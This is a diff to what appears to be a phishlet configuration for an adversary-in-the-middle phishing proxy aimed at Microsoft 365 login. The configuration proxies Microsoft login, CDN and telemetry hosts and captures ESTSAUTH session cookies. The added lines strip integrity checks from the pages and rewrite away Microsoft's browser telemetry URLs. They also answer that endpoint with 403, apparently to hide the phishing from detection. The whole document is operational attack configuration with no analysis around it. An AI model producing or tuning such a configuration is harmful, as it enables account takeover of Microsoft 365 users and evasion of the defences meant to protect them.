@@ -11,9 +11,16 @@ proxy_hosts:
   - {phish_sub: 'device', orig_sub: 'device', domain: 'login.microsoftonline.com', session: false, auto_filter: true, is_landing:false}
   - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: false, auto_filter: true, is_landing:false}
   - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'events', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: 'cdn-2', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'cdn-3', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/j>
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'appli>
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+intercept:
+  - {domain: 'browser.events.data.microsoft.com', path: '.*', http_status: 403, mime: "application/json"}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
